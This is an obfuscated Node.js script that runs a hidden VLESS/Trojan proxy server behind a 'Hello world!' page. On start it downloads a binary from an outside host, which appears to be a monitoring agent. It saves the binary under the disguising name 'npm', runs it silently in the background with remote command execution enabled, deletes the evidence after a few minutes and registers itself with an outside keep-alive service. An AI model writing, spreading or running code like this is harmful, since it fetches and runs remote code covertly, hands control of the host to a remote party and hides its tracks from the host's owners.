const _0x37c1fc=_0x46b2;(function(_0x11eca1,_0x4e2543){const _0x6cb809=_0x46b2,_0x2e2eb2=_0x11eca1();while(!![]){try{const _0x1825f3=-parseInt(_0x6cb809(0x10f))/0x1+parseInt(_0x6cb809(0x11d))/0x2+parseInt(_0x6cb809(0x116))/0x3*(parseInt(_0x6cb809(0xe9))/0x4)+parseInt(_0x6cb809(0x112))/0x5+parseInt(_0x6cb809(0xf1))/0x6+parseInt(_0x6cb809(0xe3))/0x7*(parseInt(_0x6cb809(0x12a))/0x8)+-parseInt(_0x6cb809(0x11a))/0x9*(parseInt(_0x6cb809(0xe5))/0xa);if(_0x1825f3===_0x4e2543)break;else _0x2e2eb2['push'](_0x2e2eb2['shift']());}catch(_0x45038f){_0x2e2eb2['push'](_0x2e2eb2['shift']());}}}(_0xb078,0xe8dcf));function _0xb078(){const _0xef186e=['digest','createServer','connect','true','arm64','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA_KEY','2737688SwPggQ','message','once','map','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','error','Server\x20is\x20running\x20on\x20port\x20','Answer','net','connection','trim','split','npm\x20running\x20error:','443','8443','2096','utf-8','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','14WldrfF','text/html','11581840qZdtpv','catch','axios','&path=%2F','4NERXnC','env','application/dns-json','utf8','join','pipe','crypto','Hello\x20world!','8551548zQpoeq','includes','&fp=chrome&type=ws&host=','length','stream','https://amd64.ssss.nyc.mn/v1','config.yaml','createHash','send','Status','2053','readUInt16BE','slice','path','replace','/bin/bash','Server','application/json','then','log','base64','1.1.1.1','unlink','readUInt8','Automatic\x20Access\x20Task\x20added\x20successfully','https://oooo.serv00.net/add-url','npm\x20download\x20successfully','write','2087','UUID','371392KprJmm','close','readFile','522070DQOHMT','Unknown','listen','get','799077RBZsTD','chmod\x20+x\x20npm','text/plain','data','9jYETWV','error:\x20','https://speed.cloudflare.com/meta','5860rCwxaz','substr','DOMAIN','@cdns.doon.eu.org:443?security=tls&sni=','https://','url'];_0xb078=function(){return _0xef186e;};return _0xb078();}function _0x46b2(_0x3cc9c3,_0x1cd4be){_0x3cc9c3=_0x3cc9c3-0xdd;const _0xb078cf=_0xb078();let _0x46b213=_0xb078cf[_0x3cc9c3];return _0x46b213;}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x37c1fc(0xe7)),net=require(_0x37c1fc(0x133)),path=require(_0x37c1fc(0xfe)),crypto=require(_0x37c1fc(0xef)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x37c1fc(0xea)][_0x37c1fc(0x10e)]||'0f3a46b0-3db0-4ae1-a5bf-4df403391186',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x37c1fc(0x129)]||'',DOMAIN=process['env'][_0x37c1fc(0x11f)]||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],WSPATH=process['env']['WSPATH']||UUID[_0x37c1fc(0xfd)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'woshinidie',NAME=process['env']['NAME']||'',PORT=process[_0x37c1fc(0xea)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x14f1d0=_0x37c1fc;try{const _0x468a38=await axios[_0x14f1d0(0x115)](_0x14f1d0(0x11c)),_0x907c75=_0x468a38[_0x14f1d0(0x119)];ISP=(_0x907c75['country']+'-'+_0x907c75['asOrganization'])[_0x14f1d0(0xff)](/ /g,'_');}catch(_0x22bb8c){ISP=_0x14f1d0(0x113);}};GetISP();const httpServer=http[_0x37c1fc(0x124)]((_0x228874,_0x5dce7b)=>{const _0x4e4662=_0x37c1fc;if(_0x228874['url']==='/'){const _0xa5a85a=path[_0x4e4662(0xed)](__dirname,'index.html');fs[_0x4e4662(0x111)](_0xa5a85a,_0x4e4662(0xec),(_0x2a26c3,_0x3429f2)=>{const _0x4dc2a4=_0x4e4662;if(_0x2a26c3){_0x5dce7b['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x5dce7b['end'](_0x4dc2a4(0xf0));return;}_0x5dce7b['writeHead'](0xc8,{'Content-Type':_0x4dc2a4(0xe4)}),_0x5dce7b['end'](_0x3429f2);});return;}else{if(_0x228874[_0x4e4662(0x122)]==='/'+SUB_PATH){const _0x5db75f=NAME?NAME+'-'+ISP:ISP,_0x30723d='vless://'+UUID+_0x4e4662(0xe2)+DOMAIN+_0x4e4662(0xf3)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x5db75f,_0x24f811='trojan://'+UUID+_0x4e4662(0x120)+DOMAIN+_0x4e4662(0xf3)+DOMAIN+_0x4e4662(0xe8)+WSPATH+'#'+_0x5db75f,_0x546d57=_0x30723d+'\x0a'+_0x24f811,_0x59ca50=Buffer['from'](_0x546d57)['toString'](_0x4e4662(0x105));_0x5dce7b['writeHead'](0xc8,{'Content-Type':_0x4e4662(0x118)}),_0x5dce7b['end'](_0x59ca50+'\x0a');}else _0x5dce7b['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x5dce7b['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x37c1fc(0x101))]({'server':httpServer}),uuid=UUID[_0x37c1fc(0xff)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x37c1fc(0x106)];function resolveHost(_0x32895e){return new Promise((_0x5711e8,_0x553448)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x32895e)){_0x5711e8(_0x32895e);return;}let _0x501c5e=0x0;function _0x46c492(){const _0x374818=_0x46b2;if(_0x501c5e>=DNS_SERVERS[_0x374818(0xf4)]){_0x553448(new Error('Failed\x20to\x20resolve\x20'+_0x32895e+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x1f7b7a=DNS_SERVERS[_0x501c5e];_0x501c5e++;const _0x3368d6='https://dns.google/resolve?name='+encodeURIComponent(_0x32895e)+'&type=A';axios[_0x374818(0x115)](_0x3368d6,{'timeout':0x1388,'headers':{'Accept':_0x374818(0xeb)}})[_0x374818(0x103)](_0x2a30e4=>{const _0x25c40b=_0x374818,_0x177d66=_0x2a30e4['data'];if(_0x177d66[_0x25c40b(0xfa)]===0x0&&_0x177d66[_0x25c40b(0x132)]&&_0x177d66[_0x25c40b(0x132)][_0x25c40b(0xf4)]>0x0){const _0x492347=_0x177d66[_0x25c40b(0x132)]['find'](_0x1a0d13=>_0x1a0d13['type']===0x1);if(_0x492347){_0x5711e8(_0x492347[_0x25c40b(0x119)]);return;}}_0x46c492();})[_0x374818(0xe6)](_0x56d49c=>{_0x46c492();});}_0x46c492();});}function handleVlessConnection(_0x5a63a4,_0x45e81f){const _0x3f6b47=_0x37c1fc,[_0x590ea7]=_0x45e81f,_0x480304=_0x45e81f['slice'](0x1,0x11);if(!_0x480304['every']((_0x55466d,_0x48680b)=>_0x55466d==parseInt(uuid['substr'](_0x48680b*0x2,0x2),0x10)))return![];let _0x46ba1f=_0x45e81f[_0x3f6b47(0xfd)](0x11,0x12)['readUInt8']()+0x13;const _0x4ee92d=_0x45e81f[_0x3f6b47(0xfd)](_0x46ba1f,_0x46ba1f+=0x2)[_0x3f6b47(0xfc)](0x0),_0x4d0d7f=_0x45e81f['slice'](_0x46ba1f,_0x46ba1f+=0x1)[_0x3f6b47(0x108)](),_0x50b048=_0x4d0d7f==0x1?_0x45e81f[_0x3f6b47(0xfd)](_0x46ba1f,_0x46ba1f+=0x4)['join']('.'):_0x4d0d7f==0x2?new TextDecoder()['decode'](_0x45e81f[_0x3f6b47(0xfd)](_0x46ba1f+0x1,_0x46ba1f+=0x1+_0x45e81f[_0x3f6b47(0xfd)](_0x46ba1f,_0x46ba1f+0x1)['readUInt8']())):_0x4d0d7f==0x3?_0x45e81f['slice'](_0x46ba1f,_0x46ba1f+=0x10)['reduce']((_0xfcd677,_0x232314,_0x1a22ce,_0x10e377)=>_0x1a22ce%0x2?_0xfcd677['concat'](_0x10e377[_0x3f6b47(0xfd)](_0x1a22ce-0x1,_0x1a22ce+0x1)):_0xfcd677,[])['map'](_0x4d7620=>_0x4d7620[_0x3f6b47(0xfc)](0x0)['toString'](0x10))[_0x3f6b47(0xed)](':'):'';_0x5a63a4[_0x3f6b47(0xf9)](new Uint8Array([_0x590ea7,0x0]));const _0x2568f2=createWebSocketStream(_0x5a63a4);return resolveHost(_0x50b048)[_0x3f6b47(0x103)](_0x3abec6=>{net['connect']({'host':_0x3abec6,'port':_0x4ee92d},function(){const _0x1cabe3=_0x46b2;this[_0x1cabe3(0x10c)](_0x45e81f[_0x1cabe3(0xfd)](_0x46ba1f)),_0x2568f2['on'](_0x1cabe3(0x130),()=>{})[_0x1cabe3(0xee)](this)['on'](_0x1cabe3(0x130),()=>{})[_0x1cabe3(0xee)](_0x2568f2);})['on']('error',()=>{});})['catch'](_0x18c192=>{const _0x53ae48=_0x3f6b47;net['connect']({'host':_0x50b048,'port':_0x4ee92d},function(){const _0x282c8a=_0x46b2;this['write'](_0x45e81f[_0x282c8a(0xfd)](_0x46ba1f)),_0x2568f2['on']('error',()=>{})[_0x282c8a(0xee)](this)['on']('error',()=>{})[_0x282c8a(0xee)](_0x2568f2);})['on'](_0x53ae48(0x130),()=>{});}),!![];}function handleTrojanConnection(_0x3d5c2e,_0x1ffb72){const _0xec3751=_0x37c1fc;try{if(_0x1ffb72[_0xec3751(0xf4)]<0x3a)return![];const _0x1b3ae0=_0x1ffb72['slice'](0x0,0x38)['toString'](),_0x1c5d56=[UUID];let _0x588071=null;for(const _0x5de8ca of _0x1c5d56){const _0x3e1f68=crypto[_0xec3751(0xf8)]('sha224')['update'](_0x5de8ca)[_0xec3751(0x123)]('hex');if(_0x3e1f68===_0x1b3ae0){_0x588071=_0x5de8ca;break;}}if(!_0x588071)return![];let _0x52fc52=0x38;_0x1ffb72[_0x52fc52]===0xd&&_0x1ffb72[_0x52fc52+0x1]===0xa&&(_0x52fc52+=0x2);const _0x2aff4c=_0x1ffb72[_0x52fc52];if(_0x2aff4c!==0x1)return![];_0x52fc52+=0x1;const _0x1bdd81=_0x1ffb72[_0x52fc52];_0x52fc52+=0x1;let _0x962363,_0x5b8c54;if(_0x1bdd81===0x1)_0x962363=_0x1ffb72[_0xec3751(0xfd)](_0x52fc52,_0x52fc52+0x4)[_0xec3751(0xed)]('.'),_0x52fc52+=0x4;else{if(_0x1bdd81===0x3){const _0xaeaa3f=_0x1ffb72[_0x52fc52];_0x52fc52+=0x1,_0x962363=_0x1ffb72[_0xec3751(0xfd)](_0x52fc52,_0x52fc52+_0xaeaa3f)['toString'](),_0x52fc52+=_0xaeaa3f;}else{if(_0x1bdd81===0x4)_0x962363=_0x1ffb72['slice'](_0x52fc52,_0x52fc52+0x10)['reduce']((_0x3504e3,_0x4585e2,_0x396232,_0x303280)=>_0x396232%0x2?_0x3504e3['concat'](_0x303280[_0xec3751(0xfd)](_0x396232-0x1,_0x396232+0x1)):_0x3504e3,[])[_0xec3751(0x12d)](_0x53a831=>_0x53a831['readUInt16BE'](0x0)['toString'](0x10))[_0xec3751(0xed)](':'),_0x52fc52+=0x10;else return![];}}_0x5b8c54=_0x1ffb72[_0xec3751(0xfc)](_0x52fc52),_0x52fc52+=0x2;_0x52fc52<_0x1ffb72['length']&&_0x1ffb72[_0x52fc52]===0xd&&_0x1ffb72[_0x52fc52+0x1]===0xa&&(_0x52fc52+=0x2);const _0x120814=createWebSocketStream(_0x3d5c2e);return resolveHost(_0x962363)['then'](_0x3f548c=>{net['connect']({'host':_0x3f548c,'port':_0x5b8c54},function(){const _0x4691cc=_0x46b2;_0x52fc52<_0x1ffb72['length']&&this[_0x4691cc(0x10c)](_0x1ffb72['slice'](_0x52fc52)),_0x120814['on'](_0x4691cc(0x130),()=>{})[_0x4691cc(0xee)](this)['on'](_0x4691cc(0x130),()=>{})['pipe'](_0x120814);})['on']('error',()=>{});})[_0xec3751(0xe6)](_0x166391=>{const _0x3c5ba2=_0xec3751;net[_0x3c5ba2(0x125)]({'host':_0x962363,'port':_0x5b8c54},function(){const _0x46b705=_0x3c5ba2;_0x52fc52<_0x1ffb72[_0x46b705(0xf4)]&&this[_0x46b705(0x10c)](_0x1ffb72[_0x46b705(0xfd)](_0x52fc52)),_0x120814['on'](_0x46b705(0x130),()=>{})[_0x46b705(0xee)](this)['on'](_0x46b705(0x130),()=>{})[_0x46b705(0xee)](_0x120814);})['on']('error',()=>{});}),!![];}catch(_0x20f541){return![];}}wss['on'](_0x37c1fc(0x134),(_0x12ad29,_0x486c26)=>{const _0x364e19=_0x37c1fc,_0x40af4d=_0x486c26[_0x364e19(0x122)]||'';_0x12ad29[_0x364e19(0x12c)](_0x364e19(0x12b),_0x309aae=>{const _0x4ee913=_0x364e19;if(_0x309aae[_0x4ee913(0xf4)]>0x11&&_0x309aae[0x0]===0x0){const _0x5d33f8=_0x309aae[_0x4ee913(0xfd)](0x1,0x11),_0x4430ec=_0x5d33f8['every']((_0xdf1396,_0x14459f)=>_0xdf1396==parseInt(uuid[_0x4ee913(0x11e)](_0x14459f*0x2,0x2),0x10));if(_0x4430ec){!handleVlessConnection(_0x12ad29,_0x309aae)&&_0x12ad29['close']();return;}}!handleTrojanConnection(_0x12ad29,_0x309aae)&&_0x12ad29[_0x4ee913(0x110)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0xeca775=_0x37c1fc,_0x153ada=os['arch']();return _0x153ada==='arm'||_0x153ada===_0xeca775(0x127)||_0x153ada==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0xeca775(0xf6):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x399d4a=_0x37c1fc;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x24a070=getDownloadUrl(),_0x4a7c5a=await axios({'method':_0x399d4a(0x115),'url':_0x24a070,'responseType':_0x399d4a(0xf5)}),_0x4fddc1=fs['createWriteStream']('npm');return _0x4a7c5a[_0x399d4a(0x119)]['pipe'](_0x4fddc1),new Promise((_0x3aac6e,_0x3c02c4)=>{_0x4fddc1['on']('finish',()=>{const _0x57169d=_0x46b2;console[_0x57169d(0x104)](_0x57169d(0x10b)),exec(_0x57169d(0x117),_0x4642fc=>{if(_0x4642fc)_0x3c02c4(_0x4642fc);_0x3aac6e();});}),_0x4fddc1['on']('error',_0x3c02c4);});}catch(_0x411a3a){throw _0x411a3a;}},runnz=async()=>{const _0x1d76db=_0x37c1fc;try{const _0x12c8c1=execSync(_0x1d76db(0x12e),{'encoding':_0x1d76db(0xe1)});if(_0x12c8c1[_0x1d76db(0x135)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x1f7835){}await downloadFile();let _0x2ad3cc='',_0x32e81e=[_0x1d76db(0xde),_0x1d76db(0xdf),_0x1d76db(0xe0),_0x1d76db(0x10d),'2083',_0x1d76db(0xfb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x16a3c1=_0x32e81e['includes'](NEZHA_PORT)?'--tls':'';_0x2ad3cc='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x16a3c1+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xbd6cd2=NEZHA_SERVER[_0x1d76db(0xf2)](':')?NEZHA_SERVER[_0x1d76db(0x136)](':')['pop']():'',_0x2fb514=_0x32e81e[_0x1d76db(0xf2)](_0xbd6cd2)?_0x1d76db(0x126):'false',_0x44f28f='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2fb514+_0x1d76db(0x12f)+UUID;fs['writeFileSync'](_0x1d76db(0xf7),_0x44f28f);}_0x2ad3cc=_0x1d76db(0x128);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2ad3cc,{'shell':_0x1d76db(0x100)},_0x2cf99f=>{const _0x35c390=_0x1d76db;if(_0x2cf99f)console[_0x35c390(0x130)](_0x35c390(0xdd),_0x2cf99f);else console[_0x35c390(0x104)]('npm\x20is\x20running');});}catch(_0x1c9490){console['error'](_0x1d76db(0x11b)+_0x1c9490);}};async function addAccessTask(){const _0x3bc56d=_0x37c1fc;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x43cc55=_0x3bc56d(0x121)+DOMAIN+'/'+SUB_PATH;try{const _0x49c593=await axios['post'](_0x3bc56d(0x10a),{'url':_0x43cc55},{'headers':{'Content-Type':_0x3bc56d(0x102)}});console[_0x3bc56d(0x104)](_0x3bc56d(0x109));}catch(_0x42c898){}}const delFiles=()=>{const _0x3aa638=_0x37c1fc;fs['unlink']('npm',()=>{}),fs[_0x3aa638(0x107)](_0x3aa638(0xf7),()=>{});};httpServer[_0x37c1fc(0x114)](PORT,()=>{const _0x540edc=_0x37c1fc;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x540edc(0x131)+PORT);});
